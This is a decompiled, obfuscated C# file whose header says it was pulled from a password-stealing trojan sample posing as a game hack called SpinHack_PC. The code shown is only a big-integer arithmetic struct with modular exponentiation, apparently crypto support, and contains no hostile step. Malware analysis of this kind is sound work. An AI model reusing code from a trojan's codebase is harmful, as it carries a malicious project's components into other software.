// Decompiled with JetBrains decompiler
// Type: 091051E3
// Assembly: SpinHack_PC, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 65E7A0C4-9AD9-4435-B85F-DA409F1EDFB9
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-PSW.MSIL.Growtopia.gen-6e6f85f9f7933c4446076b2de915fc2fbc76ca58137fe993addedeabb4392347.exe

using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;

[Serializable]
internal struct \u003091051E3
{
  private const uint \u00337C47047 = 2147483648;
  private const int \u0033F9570D8 = 32;
  private readonly int \u003227A1481;
  private readonly uint[] \u003641914FB;
  private static readonly \u003091051E3 \u003314465CB = new \u003091051E3(-1, new uint[1]
  {
    2147483648U
  });
  private static readonly \u003091051E3 \u00329820223 = new \u003091051E3(1);
  private static readonly \u003091051E3 \u00375E026FB = new \u003091051E3(0);
  private static readonly \u003091051E3 \u0031F2642E1 = new \u003091051E3(-1);

  [Conditional("DEBUG")]
  private void \u00312462A32()
  {
    if (this.\u003641914FB == null)
      return;
    \u003091051E3.\u0036C0544A5(this.\u003641914FB);
  }

  private static \u003091051E3 \u00366EB714B => \u003091051E3.\u00329820223;

  private bool \u00342204571 => this.\u003641914FB != null ? ((int) this.\u003641914FB[0] & 1) == 0 : (this.\u003227A1481 & 1) == 0;

  private int \u003490208F5 => (this.\u003227A1481 >> 31) - (-this.\u003227A1481 >> 31);

  public virtual bool \u00390A3B104(object _param1) => _param1 is \u003091051E3 obj && this.Equals((object) obj);

  public virtual int \u0037EC54096()
  {
    if (this.\u003641914FB == null)
      return this.\u003227A1481;
    int num = this.\u003227A1481;
    int index = \u003091051E3.\u0036C0544A5(this.\u003641914FB);
    while (--index >= 0)
      num = \u0030416139A.\u0032E650813(num, (int) this.\u003641914FB[index]);
    return num;
  }

  private int \u0036B2D5150(\u003091051E3 _param1)
  {
    if ((this.\u003227A1481 ^ _param1.\u003227A1481) < 0)
      return this.\u003227A1481 >= 0 ? 1 : -1;
    if (this.\u003641914FB == null)
    {
      if (_param1.\u003641914FB != null)
        return -_param1.\u003227A1481;
      if (this.\u003227A1481 < _param1.\u003227A1481)
        return -1;
      return this.\u003227A1481 <= _param1.\u003227A1481 ? 0 : 1;
    }
    int num1;
    int num2;
    if (_param1.\u003641914FB == null || (num1 = \u003091051E3.\u0036C0544A5(this.\u003641914FB)) > (num2 = \u003091051E3.\u0036C0544A5(_param1.\u003641914FB)))
      return this.\u003227A1481;
    if (num1 < num2)
      return -this.\u003227A1481;
    int num3 = \u003091051E3.\u0031B3C3A39(this.\u003641914FB, _param1.\u003641914FB, num1);
    if (num3 == 0)
      return 0;
    return this.\u003641914FB[num3 - 1] >= _param1.\u003641914FB[num3 - 1] ? this.\u003227A1481 : -this.\u003227A1481;
  }

  internal byte[] \u00303D162C6()
  {
    if (this.\u003641914FB == null && this.\u003227A1481 == 0)
      return new byte[1];
    uint[] numArray;
    byte num1;
    if (this.\u003641914FB == null)
    {
      numArray = new uint[1]{ (uint) this.\u003227A1481 };
      num1 = this.\u003227A1481 < 0 ? byte.MaxValue : (byte) 0;
    }
    else if (this.\u003227A1481 == -1)
    {
      numArray = (uint[]) this.\u003641914FB.Clone();
      \u0030416139A.\u00367274660(numArray);
      num1 = byte.MaxValue;
    }
    else
    {
      numArray = this.\u003641914FB;
      num1 = (byte) 0;
    }
    byte[] sourceArray = new byte[checked (4 * numArray.Length)];
    int num2 = 0;
    foreach (uint num3 in numArray)
    {
      for (int index = 0; index < 4; ++index)
      {
        sourceArray[num2++] = (byte) (num3 & (uint) byte.MaxValue);
        num3 >>= 8;
      }
    }
    if (((int) sourceArray[sourceArray.Length - 1] & 128) == ((int) num1 & 128))
      return sourceArray;
    byte[] destinationArray = new byte[sourceArray.Length + 1];
    Array.Copy((Array) sourceArray, (Array) destinationArray, sourceArray.Length);
    destinationArray[destinationArray.Length - 1] = num1;
    return destinationArray;
  }

  private \u003091051E3(int _param1)
  {
    if (_param1 == int.MinValue)
    {
      this = \u003091051E3.\u003314465CB;
    }
    else
    {
      this.\u003227A1481 = _param1;
      this.\u003641914FB = (uint[]) null;
    }
  }

  internal \u003091051E3(byte[] _param1)
  {
    int num1 = _param1 != null ? _param1.Length : throw new ArgumentNullException("value");
    bool flag1 = num1 > 0 && ((int) _param1[num1 - 1] & 128) == 128;
    while (num1 > 0 && _param1[num1 - 1] == (byte) 0)
      --num1;
    if (num1 == 0)
    {
      this.\u003227A1481 = 0;
      this.\u003641914FB = (uint[]) null;
    }
    else if (num1 <= 4)
    {
      this.\u003227A1481 = !flag1 ? 0 : -1;
      for (int index = num1 - 1; index >= 0; --index)
      {
        this.\u003227A1481 <<= 8;
        this.\u003227A1481 |= (int) _param1[index];
      }
      this.\u003641914FB = (uint[]) null;
      if (this.\u003227A1481 < 0 && !flag1)
      {
        this.\u003641914FB = new uint[1];
        this.\u003641914FB[0] = (uint) this.\u003227A1481;
        this.\u003227A1481 = 1;
      }
      if (this.\u003227A1481 != int.MinValue)
        return;
      this = \u003091051E3.\u003314465CB;
    }
    else
    {
      int num2 = num1 % 4;
      int length1 = num1 / 4 + (num2 == 0 ? 0 : 1);
      bool flag2 = true;
      uint[] sourceArray = new uint[length1];
      int index1 = 3;
      int index2;
      for (index2 = 0; index2 < length1 - (num2 == 0 ? 0 : 1); ++index2)
      {
        for (int index3 = 0; index3 < 4; ++index3)
        {
          if (_param1[index1] != (byte) 0)
            flag2 = false;
          sourceArray[index2] <<= 8;
          sourceArray[index2] |= (uint) _param1[index1];
          --index1;
        }
        index1 += 8;
      }
      if (num2 != 0)
      {
        if (flag1)
          sourceArray[length1 - 1] = uint.MaxValue;
        for (int index4 = num1 - 1; index4 >= num1 - num2; --index4)
        {
          if (_param1[index4] != (byte) 0)
            flag2 = false;
          sourceArray[index2] <<= 8;
          sourceArray[index2] |= (uint) _param1[index4];
        }
      }
      if (flag2)
        this = \u003091051E3.\u00375E026FB;
      else if (flag1)
      {
        \u0030416139A.\u00367274660(sourceArray);
        int length2 = sourceArray.Length;
        while (length2 > 0 && sourceArray[length2 - 1] == 0U)
          --length2;
        if (length2 == 1 && (int) sourceArray[0] > 0)
        {
          if (sourceArray[0] == 1U)
            this = \u003091051E3.\u0031F2642E1;
          else if (sourceArray[0] == 2147483648U)
          {
            this = \u003091051E3.\u003314465CB;
          }
          else
          {
            this.\u003227A1481 = -1 * (int) sourceArray[0];
            this.\u003641914FB = (uint[]) null;
          }
        }
        else if (length2 != sourceArray.Length)
        {
          this.\u003227A1481 = -1;
          this.\u003641914FB = new uint[length2];
          Array.Copy((Array) sourceArray, (Array) this.\u003641914FB, length2);
        }
        else
        {
          this.\u003227A1481 = -1;
          this.\u003641914FB = sourceArray;
        }
      }
      else
      {
        this.\u003227A1481 = 1;
        this.\u003641914FB = sourceArray;
      }
    }
  }

  internal \u003091051E3(int _param1, uint[] _param2)
  {
    this.\u003227A1481 = _param1;
    this.\u003641914FB = _param2;
  }

  private static void \u00332E94A25(
    ref \u0030C4572BE _param0,
    ref \u0030C4572BE _param1,
    ref \u0030C4572BE _param2,
    ref \u0030C4572BE _param3)
  {
    \u0030416139A.\u00330CE6A90<\u0030C4572BE>(ref _param0, ref _param3);
    _param0.\u00344702956(ref _param3, ref _param1);
    _param0.\u00305E80531(ref _param2);
  }

  private static void \u003417568AC(
    ref \u0030C4572BE _param0,
    ref \u0030C4572BE _param1,
    ref \u0030C4572BE _param2)
  {
    \u0030416139A.\u00330CE6A90<\u0030C4572BE>(ref _param0, ref _param2);
    _param0.\u00344702956(ref _param2, ref _param2);
    _param0.\u00305E80531(ref _param1);
  }

  private static void \u0033F033DB6(
    uint _param0,
    ref \u0030C4572BE _param1,
    ref \u0030C4572BE _param2,
    ref \u0030C4572BE _param3,
    ref \u0030C4572BE _param4)
  {
    for (; _param0 != 0U; _param0 >>= 1)
    {
      if (((int) _param0 & 1) == 1)
        \u003091051E3.\u00332E94A25(ref _param1, ref _param2, ref _param3, ref _param4);
      if (_param0 == 1U)
        break;
      \u003091051E3.\u003417568AC(ref _param2, ref _param3, ref _param4);
    }
  }

  private static void \u0034B681821(
    uint _param0,
    ref \u0030C4572BE _param1,
    ref \u0030C4572BE _param2,
    ref \u0030C4572BE _param3,
    ref \u0030C4572BE _param4)
  {
    for (int index = 0; index < 32; ++index)
    {
      if (((int) _param0 & 1) == 1)
        \u003091051E3.\u00332E94A25(ref _param1, ref _param2, ref _param3, ref _param4);
      \u003091051E3.\u003417568AC(ref _param2, ref _param3, ref _param4);
      _param0 >>= 1;
    }
  }

  internal static \u003091051E3 \u00356FA5814(
    \u003091051E3 _param0,
    \u003091051E3 _param1,
    \u003091051E3 _param2)
  {
    if (_param1.\u003490208F5 < 0)
      throw new ArgumentOutOfRangeException("exponent", "ArgumentOutOfRange must be non negative");
    int num1 = 1;
    int num2 = 1;
    int num3 = 1;
    bool flag = _param1.\u00342204571;
    \u0030C4572BE obj1 = new \u0030C4572BE(\u003091051E3.\u00366EB714B, ref num1);
    \u0030C4572BE obj2 = new \u0030C4572BE(_param0, ref num2);
    \u0030C4572BE obj3 = new \u0030C4572BE(_param2, ref num3);
    \u0030C4572BE obj4 = new \u0030C4572BE(obj2.\u00344E11B3B);
    obj1.\u00305E80531(ref obj3);
    if (_param1.\u003641914FB == null)
    {
      \u003091051E3.\u0033F033DB6((uint) _param1.\u003227A1481, ref obj1, ref obj2, ref obj3, ref obj4);
    }
    else
    {
      int num4 = \u003091051E3.\u0036C0544A5(_param1.\u003641914FB);
      for (int index = 0; index < num4 - 1; ++index)
        \u003091051E3.\u0034B681821(_param1.\u003641914FB[index], ref obj1, ref obj2, ref obj3, ref obj4);
      \u003091051E3.\u0033F033DB6(_param1.\u003641914FB[num4 - 1], ref obj1, ref obj2, ref obj3, ref obj4);
    }
    return obj1.\u003252F045B(_param0.\u003227A1481 > 0 ? 1 : (flag ? 1 : -1));
  }

  [SpecialName]
  public static bool \u00355C56BE4(\u003091051E3 _param0, \u003091051E3 _param1) => _param0.\u0036B2D5150(_param1) < 0;

  [SpecialName]
  public static bool \u003055D4923(\u003091051E3 _param0, \u003091051E3 _param1) => _param0.\u0036B2D5150(_param1) <= 0;

  [SpecialName]
  public static bool \u00322316B1B(\u003091051E3 _param0, \u003091051E3 _param1) => _param0.\u0036B2D5150(_param1) > 0;

  [SpecialName]
  public static bool \u003108E6A4D(\u003091051E3 _param0, \u003091051E3 _param1) => _param0.\u0036B2D5150(_param1) >= 0;

  [SpecialName]
  public static bool \u0035EBB1CA3(\u003091051E3 _param0, \u003091051E3 _param1) => _param0.Equals((object) _param1);

  [SpecialName]
  public static bool \u00370C66C77(\u003091051E3 _param0, \u003091051E3 _param1) => !_param0.Equals((object) _param1);

  private static int \u0036C0544A5(uint[] _param0)
  {
    int length = _param0.Length;
    return _param0[length - 1] != 0U ? length : length - 1;
  }

  internal int \u0034F9874EC => this.\u003227A1481;

  internal uint[] \u00333286000 => this.\u003641914FB;

  private static int \u0031B3C3A39(uint[] _param0, uint[] _param1, int _param2)
  {
    int index = _param2;
    while (--index >= 0)
    {
      if ((int) _param0[index] != (int) _param1[index])
        return index + 1;
    }
    return 0;
  }
}
